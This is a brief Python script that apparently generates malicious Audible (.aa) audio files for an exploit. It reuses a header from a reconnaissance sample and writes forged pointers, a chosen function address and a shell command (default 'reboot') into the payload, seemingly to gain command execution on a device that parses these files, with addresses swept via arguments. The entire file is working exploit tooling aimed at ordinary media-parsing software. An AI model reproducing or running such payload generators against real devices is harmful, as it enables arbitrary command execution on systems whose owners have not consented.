#!/usr/bin/env python3
import struct,sys
base=open("recon/tnzm_audible/sweep2/CAN135_00710000.aa","rb").read()
def rebuild(S,fn,cmd:bytes=b"reboot\x00"):
    b=bytearray(24000); d=lambda off: S+6380+off
    struct.pack_into(">I",b,108,d(200)); struct.pack_into(">I",b,200,d(600))
    struct.pack_into(">I",b,628,fn); struct.pack_into(">I",b,6404,d(100))
    struct.pack_into(">I",b,23620,d(0))
    b[0:len(cmd)]=cmd
    return bytes(base[:36])+bytes(b)
if __name__=="__main__":
    S=int(sys.argv[1],16); fn=int(sys.argv[2],16); cmd=sys.argv[3].encode()+b"\x00" if len(sys.argv)>3 else b"reboot\x00"
    out=f"recon/tnzm_audible/sweep2/S2FN_{fn:06x}_{S:06x}.aa"
    open(out,"wb").write(rebuild(S,fn,cmd)); print("wrote",out)
